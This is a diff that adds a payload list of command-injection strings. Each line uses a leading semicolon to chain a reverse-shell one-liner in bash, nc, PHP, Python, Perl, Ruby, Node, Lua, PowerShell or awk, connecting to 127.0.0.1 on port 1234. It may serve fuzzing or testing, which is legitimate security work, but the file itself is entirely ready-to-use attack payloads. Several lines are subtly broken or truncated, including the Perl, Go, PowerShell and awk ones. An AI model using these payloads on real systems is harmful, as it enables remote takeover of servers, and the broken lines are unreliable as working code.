@@ -1,0 +1,11 @@
+; nc -e /bin/sh 127.0.0.1 1234
+; bash -i >& /dev/tcp/127.0.0.1/1234 0>&1
+; php -r '$sock=fsockopen("127.0.0.1",1234); exec("/bin/sh -i <&3 >&3 2>&3");'
+; python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("127.0.0.1",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+; perl -e 'use Socket; $i="127.0.0.1"; $p=1234; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S");e xec("/bin/sh -i");};'
+; ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",1234).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+; go run -e 'package main; import"os/exec"; func main(){cmd:=exec.Command("/bin/sh","-i"); cmd.Stdin=os.Stdin; cmd.Stdout=os.Stdout; cmd.Stderr=os.Stderr; cmd.Run();}'
+; lua -e 'local s=require("socket"); local t=assert(s.tcp()); t:connect("127.0.0.1",1234); while true do local r,x=assert(t:receive("*l")); local f=assert(io.popen(r,"r")); local b=assert(f:read("*a")); t:send(b);end'
+; node -e 'var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(1234, "127.0.0.1", function() { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });'
+; powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("127.0.0.1",1234); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}
+; awk 'BEGIN {s = "/inet/tcp/0/127.0.0.1/1234"; while(42) { do{ printf "> " |& s; s |& getline c; if(c) { while((c |& getline) > 0) print $0 |& s; close(c); }
